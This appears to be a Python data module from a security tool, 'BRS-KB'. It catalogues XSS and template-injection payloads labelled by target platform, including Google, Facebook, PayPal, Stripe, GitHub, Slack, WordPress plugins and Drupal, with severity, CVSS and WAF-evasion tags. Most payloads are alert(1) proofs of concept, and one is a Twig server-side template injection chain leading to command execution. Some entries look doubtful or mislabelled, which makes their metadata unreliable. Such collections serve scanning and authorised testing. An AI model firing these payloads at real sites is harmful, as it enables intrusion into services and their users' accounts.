# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-26 UTC
# Status: Created
# Telegram: https://t.me/EasyProTech

"""
Real Bug Bounty XSS Payloads

Payloads inspired by real bug bounty reports and disclosed vulnerabilities.
These are actual patterns that worked in real targets.
"""

from ..models import PayloadEntry


BRS_KB_BUGBOUNTY_REAL_PAYLOADS = {
    # ============================================================
    # GOOGLE BUG BOUNTY STYLE
    # ============================================================
    "google-amp-xss": PayloadEntry(
        payload='<amp-script src="data:text/javascript,alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="AMP script tag bypass (Google style)",
        tags=["google", "amp", "bugbounty"],
        bypasses=["amp_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "google-docs-formula-xss": PayloadEntry(
        payload='=IMAGE("javascript:alert(1)")',
        contexts=["json"],
        severity="high",
        cvss_score=8.0,
        description="Google Docs formula injection pattern",
        tags=["google", "docs", "formula"],
        bypasses=["formula_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "google-translate-xss": PayloadEntry(
        payload='<a href="//translate.google.com/translate?u=javascript:alert(1)">',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="Google Translate redirect pattern",
        tags=["google", "translate"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # FACEBOOK BUG BOUNTY STYLE
    # ============================================================
    "facebook-open-graph-xss": PayloadEntry(
        payload='<meta property="og:url" content="javascript:alert(1)">',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Open Graph meta tag injection",
        tags=["facebook", "opengraph"],
        bypasses=["meta_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "facebook-share-xss": PayloadEntry(
        payload="https://www.facebook.com/sharer/sharer.php?u=javascript:alert(document.domain)",
        contexts=["url"],
        severity="high",
        cvss_score=7.5,
        description="Facebook share dialog pattern",
        tags=["facebook", "share"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # TWITTER/X BUG BOUNTY STYLE
    # ============================================================
    "twitter-card-xss": PayloadEntry(
        payload='<meta name="twitter:player" content="javascript:alert(1)">',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="Twitter Card player injection",
        tags=["twitter", "card"],
        bypasses=["meta_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "twitter-intent-xss": PayloadEntry(
        payload='https://twitter.com/intent/tweet?text="><img src=x onerror=alert(1)>',
        contexts=["url"],
        severity="high",
        cvss_score=7.5,
        description="Twitter intent parameter injection",
        tags=["twitter", "intent"],
        bypasses=["param_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # MICROSOFT BUG BOUNTY STYLE
    # ============================================================
    "outlook-safelinks-bypass": PayloadEntry(
        payload="https://safelinks.protection.outlook.com/?url=javascript%3Aalert(1)",
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Outlook SafeLinks bypass pattern",
        tags=["microsoft", "outlook", "safelinks"],
        bypasses=["safelinks"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "teams-deeplink-xss": PayloadEntry(
        payload='msteams://teams.microsoft.com/l/chat/0/0?users="><script>alert(1)</script>',
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Microsoft Teams deeplink injection",
        tags=["microsoft", "teams", "deeplink"],
        bypasses=["deeplink_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # PAYPAL BUG BOUNTY STYLE
    # ============================================================
    "paypal-callback-xss": PayloadEntry(
        payload="return_url=javascript:alert(document.domain)",
        contexts=["url"],
        severity="critical",
        cvss_score=9.0,
        description="PayPal return URL injection",
        tags=["paypal", "callback"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # SHOPIFY BUG BOUNTY STYLE
    # ============================================================
    "shopify-liquid-xss": PayloadEntry(
        payload='{{ "test" | append: "<script>alert(1)</script>" }}',
        contexts=["template"],
        severity="high",
        cvss_score=8.0,
        description="Shopify Liquid template injection",
        tags=["shopify", "liquid"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # UBER BUG BOUNTY STYLE
    # ============================================================
    "uber-deeplink-xss": PayloadEntry(
        payload='uber://?action=setPickup&pickup[nickname]="><script>alert(1)</script>',
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Uber deeplink parameter injection",
        tags=["uber", "deeplink"],
        bypasses=["deeplink_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # GITHUB BUG BOUNTY STYLE
    # ============================================================
    "github-markdown-xss-1": PayloadEntry(
        payload="[clickme](javascript:alert(1))",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="GitHub Markdown link injection",
        tags=["github", "markdown"],
        bypasses=["markdown_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "github-markdown-xss-2": PayloadEntry(
        payload="![alt](javascript:alert(1))",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="GitHub Markdown image injection",
        tags=["github", "markdown"],
        bypasses=["markdown_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "github-wiki-xss": PayloadEntry(
        payload="[[page|javascript:alert(1)]]",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="GitHub Wiki link injection",
        tags=["github", "wiki"],
        bypasses=["wiki_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "github-actions-xss": PayloadEntry(
        payload="${{ github.event.issue.title }}",
        contexts=["json"],
        severity="critical",
        cvss_score=9.0,
        description="GitHub Actions expression injection",
        tags=["github", "actions", "expression"],
        bypasses=["expression_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SLACK BUG BOUNTY STYLE
    # ============================================================
    "slack-mrkdwn-xss": PayloadEntry(
        payload="<javascript:alert(1)|Click here>",
        contexts=["postmessage"],
        severity="high",
        cvss_score=7.5,
        description="Slack mrkdwn link injection",
        tags=["slack", "mrkdwn"],
        bypasses=["slack_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "slack-unfurl-xss": PayloadEntry(
        payload='<a href="javascript:alert(1)" title="click">link</a>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Slack unfurl preview injection",
        tags=["slack", "unfurl"],
        bypasses=["unfurl_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # JIRA/ATLASSIAN BUG BOUNTY STYLE
    # ============================================================
    "jira-wiki-xss": PayloadEntry(
        payload="{html}<script>alert(1)</script>{html}",
        contexts=["markdown"],
        severity="high",
        cvss_score=8.0,
        description="Jira wiki markup HTML injection",
        tags=["jira", "wiki"],
        bypasses=["wiki_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "confluence-macro-xss": PayloadEntry(
        payload="{code:javascript}alert(1){code}",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Confluence macro injection",
        tags=["confluence", "macro"],
        bypasses=["macro_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # SALESFORCE BUG BOUNTY STYLE
    # ============================================================
    "salesforce-visualforce-xss": PayloadEntry(
        payload='<apex:outputText value="{!$CurrentPage.parameters.xss}" escape="false"/>',
        contexts=["template"],
        severity="critical",
        cvss_score=9.0,
        description="Salesforce Visualforce parameter injection",
        tags=["salesforce", "visualforce"],
        bypasses=["apex_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # YAHOO BUG BOUNTY STYLE
    # ============================================================
    "yahoo-mail-xss": PayloadEntry(
        payload='<div style="background:url(javascript:alert(1))">',
        contexts=["html_content", "email"],
        severity="high",
        cvss_score=8.0,
        description="Yahoo Mail CSS background injection",
        tags=["yahoo", "mail", "css"],
        bypasses=["css_filters"],
        waf_evasion=True,
        browser_support=["ie"],
        reliability="low",
    ),
    # ============================================================
    # ADOBE BUG BOUNTY STYLE
    # ============================================================
    "adobe-flash-xss": PayloadEntry(
        payload='getURL("javascript:alert(1)")',
        contexts=["flash"],
        severity="high",
        cvss_score=7.5,
        description="Adobe Flash getURL injection",
        tags=["adobe", "flash"],
        bypasses=["flash_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    "adobe-pdf-js-xss": PayloadEntry(
        payload="app.alert(1)",
        contexts=["pdf"],
        severity="high",
        cvss_score=7.5,
        description="Adobe PDF JavaScript execution",
        tags=["adobe", "pdf"],
        bypasses=["pdf_filters"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # DROPBOX BUG BOUNTY STYLE
    # ============================================================
    "dropbox-preview-xss": PayloadEntry(
        payload='<svg onload="alert(1)">',
        contexts=["svg"],
        severity="high",
        cvss_score=8.0,
        description="Dropbox file preview SVG injection",
        tags=["dropbox", "preview", "svg"],
        bypasses=["preview_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # LINKEDIN BUG BOUNTY STYLE
    # ============================================================
    "linkedin-profile-xss": PayloadEntry(
        payload='"><script>alert(1)</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="LinkedIn profile field injection",
        tags=["linkedin", "profile"],
        bypasses=["profile_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # AIRBNB BUG BOUNTY STYLE
    # ============================================================
    "airbnb-listing-xss": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Airbnb listing description injection",
        tags=["airbnb", "listing"],
        bypasses=["listing_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # STRIPE BUG BOUNTY STYLE
    # ============================================================
    "stripe-checkout-xss": PayloadEntry(
        payload="success_url=javascript:alert(document.domain)",
        contexts=["url"],
        severity="critical",
        cvss_score=9.0,
        description="Stripe checkout redirect injection",
        tags=["stripe", "checkout"],
        bypasses=["url_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # ZENDESK BUG BOUNTY STYLE
    # ============================================================
    "zendesk-ticket-xss": PayloadEntry(
        payload="{{#each articles}}<script>alert(1)</script>{{/each}}",
        contexts=["template"],
        severity="high",
        cvss_score=8.0,
        description="Zendesk Handlebars template injection",
        tags=["zendesk", "handlebars"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # MAILCHIMP BUG BOUNTY STYLE
    # ============================================================
    "mailchimp-merge-xss": PayloadEntry(
        payload='*|UNSUB|*"><script>alert(1)</script>',
        contexts=["email"],
        severity="high",
        cvss_score=7.5,
        description="Mailchimp merge tag injection",
        tags=["mailchimp", "merge"],
        bypasses=["merge_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # TWILIO BUG BOUNTY STYLE
    # ============================================================
    "twilio-twiml-xss": PayloadEntry(
        payload="<Say><![CDATA[<script>alert(1)</script>]]></Say>",
        contexts=["xml"],
        severity="high",
        cvss_score=7.5,
        description="Twilio TwiML CDATA injection",
        tags=["twilio", "twiml", "xml"],
        bypasses=["xml_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # NOTION BUG BOUNTY STYLE
    # ============================================================
    "notion-embed-xss": PayloadEntry(
        payload="/embed?url=javascript:alert(1)",
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Notion embed URL injection",
        tags=["notion", "embed"],
        bypasses=["embed_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # FIGMA BUG BOUNTY STYLE
    # ============================================================
    "figma-plugin-xss": PayloadEntry(
        payload='figma.showUI("<script>alert(1)</script>")',
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="Figma plugin UI injection",
        tags=["figma", "plugin"],
        bypasses=["plugin_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # DISCORD BUG BOUNTY STYLE
    # ============================================================
    "discord-embed-xss": PayloadEntry(
        payload='{"embeds":[{"url":"javascript:alert(1)"}]}',
        contexts=["json"],
        severity="high",
        cvss_score=7.5,
        description="Discord webhook embed injection",
        tags=["discord", "embed"],
        bypasses=["embed_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # TRELLO BUG BOUNTY STYLE
    # ============================================================
    "trello-card-xss": PayloadEntry(
        payload="[link](javascript:alert(1))",
        contexts=["markdown"],
        severity="high",
        cvss_score=7.5,
        description="Trello card description injection",
        tags=["trello", "markdown"],
        bypasses=["markdown_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # ASANA BUG BOUNTY STYLE
    # ============================================================
    "asana-task-xss": PayloadEntry(
        payload='<a href="javascript:alert(1)">click</a>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Asana task description injection",
        tags=["asana", "task"],
        bypasses=["task_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # WORDPRESS PLUGIN VULNERABILITIES
    # ============================================================
    "wp-contact-form-7": PayloadEntry(
        payload='[contact-form-7 id="1" html_id="<script>alert(1)</script>"]',
        contexts=["template"],
        severity="high",
        cvss_score=8.0,
        description="Contact Form 7 shortcode injection",
        tags=["wordpress", "plugin", "cf7"],
        bypasses=["shortcode_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "wp-yoast-seo": PayloadEntry(
        payload="<script>alert(1)</script><!--googleoff: index-->",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Yoast SEO meta injection pattern",
        tags=["wordpress", "plugin", "yoast"],
        bypasses=["seo_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    "wp-elementor": PayloadEntry(
        payload='{"id":"x","settings":{"custom_css":"</style><script>alert(1)</script><style>"}}',
        contexts=["json"],
        severity="high",
        cvss_score=8.0,
        description="Elementor custom CSS injection",
        tags=["wordpress", "plugin", "elementor"],
        bypasses=["css_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # CMS SPECIFIC
    # ============================================================
    "drupal-twig-xss": PayloadEntry(
        payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        contexts=["template"],
        severity="critical",
        cvss_score=9.5,
        description="Drupal Twig SSTI to RCE",
        tags=["drupal", "twig", "ssti"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "magento-widget-xss": PayloadEntry(
        payload='{{widget type="Magento\\Cms\\Block\\Widget\\Block" template="<script>alert(1)</script>"}}',
        contexts=["template"],
        severity="high",
        cvss_score=8.0,
        description="Magento widget directive injection",
        tags=["magento", "widget"],
        bypasses=["widget_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "prestashop-smarty-xss": PayloadEntry(
        payload="{$smarty.version}{literal}<script>alert(1)</script>{/literal}",
        contexts=["template"],
        severity="high",
        cvss_score=8.0,
        description="PrestaShop Smarty template injection",
        tags=["prestashop", "smarty"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
}

BRS_KB_BUGBOUNTY_REAL_TOTAL_PAYLOADS = len(BRS_KB_BUGBOUNTY_REAL_PAYLOADS)
